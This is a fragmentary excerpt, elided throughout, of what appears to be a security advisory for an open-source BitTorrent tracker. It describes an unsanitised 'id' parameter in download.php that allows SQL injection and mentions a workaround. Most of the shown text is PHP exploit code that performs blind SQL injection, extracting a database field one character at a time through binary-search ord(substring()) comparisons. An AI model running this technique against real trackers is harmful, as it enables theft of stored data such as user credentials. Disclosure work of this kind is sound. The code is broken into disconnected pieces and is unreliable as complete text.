...
/*
        ...
        and highly customisable open-source BitTorrent tracker."
...
++  Vulnerability description  & workaround++
        ...
        There is no user input sanization for parameter "id" in download.php
        prior beeing used in a SQL query. This can be exploited to manipulate SQL
queries by injecting arbitrary SQL code. A workaround to solve this is to
modify download.php, line13:
...
test_cond($bas."id=1%20and%20ord(substring($field,$idx,1))=".ord(substr($unval,$mid,1)))
                        ...
                        $max=strlen($unval);
                        if(
                        !test_cond($bas."id=1%20and%20ord(substring($field,$idx,1))") ) return;
                } else {
                        if(
test_cond($bas."id=1%20and%20ord(substring($field,$idx,1))<".ord(substr($unval,$mid,1)))
) $max=$mid;
